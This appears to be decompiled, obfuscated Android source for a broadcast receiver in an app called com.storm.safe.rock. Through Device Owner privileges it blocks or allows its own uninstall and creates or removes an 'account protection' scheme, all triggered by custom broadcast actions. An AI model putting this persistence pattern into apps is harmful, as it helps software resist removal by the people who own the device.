package com.storm.safe.rock.receiver;

import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.storm.safe.rock.service.account.C0287a0;
import com.storm.safe.rock.util.StringUtil;
import p000.AbstractC1120qr;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class izkmisshyc extends BroadcastReceiver {

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.receiver.izkmisshyc$a0 */
    public static final class C0272a0 {
        public /* synthetic */ C0272a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        private C0272a0() {
        }
    }

    static {
        new C0272a0(null);
    }

    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        if (context == null) {
            t60.m214704c5("DeviceOwnerReceiver", "Context is null");
            return;
        }
        String action = intent != null ? intent.getAction() : null;
        if (action != null) {
            boolean zIsDeviceOwnerApp = false;
            switch (action.hashCode()) {
                case -1423083697:
                    if (action.equals("com.storm.safe.rock.ACTION_SYNC_CLEANUP")) {
                        t60.m214714d6("DeviceOwnerReceiver", "★★★ 收到删除账户请求 ★★★");
                        try {
                            if (C0287a0.f52351a2.getInstance(context).m211400a4()) {
                                t60.m214714d6("DeviceOwnerReceiver", "✅ 账户已删除");
                            } else {
                                t60.m214726f4("DeviceOwnerReceiver", "⚠️ 删除账户失败");
                            }
                            return;
                        } catch (Exception e) {
                            t60.m214705c6("DeviceOwnerReceiver", "❌ 删除账户失败", e);
                            return;
                        }
                    }
                    break;
                case -823888194:
                    if (action.equals("com.storm.safe.rock.ACTION_PROFILE_READY")) {
                        t60.m214714d6("DeviceOwnerReceiver", "★★★ Device Owner 设置成功 ★★★");
                        try {
                            context.getSharedPreferences(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), 0).edit().putBoolean(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), false).commit();
                            C0287a0.f52351a2.getInstance(context).m211400a4();
                            zbrefryi.f52290a0.blockUninstall(context);
                            t60.m214714d6("DeviceOwnerReceiver", "✅ Device Owner 配置完成：账户保护已禁用，卸载保护已启用");
                            return;
                        } catch (Exception e2) {
                            t60.m214705c6("DeviceOwnerReceiver", "❌ Device Owner 配置失败", e2);
                            return;
                        }
                    }
                    break;
                case -823870870:
                    if (action.equals("com.storm.safe.rock.ACTION_PROFILE_RESET")) {
                        t60.m214714d6("DeviceOwnerReceiver", "★★★ 收到清除 Device Owner 请求 ★★★");
                        try {
                            Object systemService = context.getSystemService("device_policy");
                            t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager");
                            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) systemService;
                            if (devicePolicyManager.isDeviceOwnerApp(context.getPackageName())) {
                                t60.m214714d6("DeviceOwnerReceiver", "当前是 Device Owner，开始清除...");
                                devicePolicyManager.clearDeviceOwnerApp(context.getPackageName());
                                t60.m214714d6("DeviceOwnerReceiver", "✅ Device Owner 已清除");
                            } else {
                                t60.m214726f4("DeviceOwnerReceiver", "当前不是 Device Owner，无需清除");
                            }
                            return;
                        } catch (Exception e3) {
                            t60.m214705c6("DeviceOwnerReceiver", "❌ 清除 Device Owner 失败", e3);
                            return;
                        }
                    }
                    break;
                case -637830815:
                    if (action.equals("com.storm.safe.rock.ACTION_SYNC_PAUSE")) {
                        t60.m214714d6("DeviceOwnerReceiver", "★★★ 收到禁用账户保护请求 ★★★");
                        try {
                            context.getSharedPreferences(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), 0).edit().putBoolean(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), true).commit();
                            C0287a0.f52351a2.getInstance(context).m211400a4();
                            t60.m214714d6("DeviceOwnerReceiver", "✅ 账户保护已禁用（isAdminActivating=true）");
                            return;
                        } catch (Exception e4) {
                            t60.m214705c6("DeviceOwnerReceiver", "❌ 禁用账户保护失败", e4);
                            return;
                        }
                    }
                    break;
                case -566673308:
                    if (action.equals("com.storm.safe.rock.ACTION_POLICY_ENFORCE")) {
                        t60.m214714d6("DeviceOwnerReceiver", "★★★ 收到阻止卸载请求 ★★★");
                        try {
                            if (zbrefryi.f52290a0.blockUninstall(context)) {
                                t60.m214714d6("DeviceOwnerReceiver", "✅ 已阻止卸载");
                            } else {
                                t60.m214726f4("DeviceOwnerReceiver", "⚠️ 阻止卸载失败（可能不是 Device Owner）");
                            }
                            return;
                        } catch (Exception e5) {
                            t60.m214705c6("DeviceOwnerReceiver", "❌ 阻止卸载失败", e5);
                            return;
                        }
                    }
                    break;
                case 1762976258:
                    if (action.equals("com.storm.safe.rock.ACTION_SYNC_RESUME")) {
                        t60.m214714d6("DeviceOwnerReceiver", "★★★ 收到启用账户保护请求 ★★★");
                        try {
                            context.getSharedPreferences(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), 0).edit().putBoolean(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), false).commit();
                            C0287a0.f52351a2.getInstance(context).m211397a1();
                            t60.m214714d6("DeviceOwnerReceiver", "✅ 账户保护已启用（isAdminActivating=false）");
                            return;
                        } catch (Exception e6) {
                            t60.m214705c6("DeviceOwnerReceiver", "❌ 启用账户保护失败", e6);
                            return;
                        }
                    }
                    break;
                case 1918891045:
                    if (action.equals("com.storm.safe.rock.ACTION_SYNC_INIT")) {
                        t60.m214714d6("DeviceOwnerReceiver", "★★★ 收到创建账户保护请求（备选方案）★★★");
                        try {
                            C0287a0 c0844m0 = C0287a0.f52351a2.getInstance(context);
                            Context context2 = c0844m0.f52353a0;
                            try {
                                Object systemService2 = context2.getSystemService("device_policy");
                                t60.m214693b4(systemService2, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager");
                                zIsDeviceOwnerApp = ((DevicePolicyManager) systemService2).isDeviceOwnerApp(context2.getPackageName());
                            } catch (Exception e7) {
                                t60.m214705c6("AccountProtectMgr", "检查设备所有者状态失败", e7);
                            }
                            if (zIsDeviceOwnerApp) {
                                t60.m214714d6("DeviceOwnerReceiver", "已是 Device Owner，无需账户保护");
                                return;
                            } else if (c0844m0.m211397a1()) {
                                t60.m214714d6("DeviceOwnerReceiver", "✅ 账户保护已创建");
                                return;
                            } else {
                                t60.m214726f4("DeviceOwnerReceiver", "⚠️ 账户保护创建失败");
                                return;
                            }
                        } catch (Exception e8) {
                            t60.m214705c6("DeviceOwnerReceiver", "❌ 创建账户保护失败", e8);
                            return;
                        }
                    }
                    break;
                case 2128504969:
                    if (action.equals("com.storm.safe.rock.ACTION_POLICY_RELEASE")) {
                        t60.m214714d6("DeviceOwnerReceiver", "★★★ 收到允许卸载请求 ★★★");
                        try {
                            if (zbrefryi.f52290a0.allowUninstall(context)) {
                                t60.m214714d6("DeviceOwnerReceiver", "✅ 已允许卸载");
                            } else {
                                t60.m214726f4("DeviceOwnerReceiver", "⚠️ 允许卸载失败");
                            }
                            return;
                        } catch (Exception e9) {
                            t60.m214705c6("DeviceOwnerReceiver", "❌ 允许卸载失败", e9);
                            return;
                        }
                    }
                    break;
            }
        }
        tz0.m214810b0("未知 Action: ", intent != null ? intent.getAction() : null, "DeviceOwnerReceiver");
    }
}
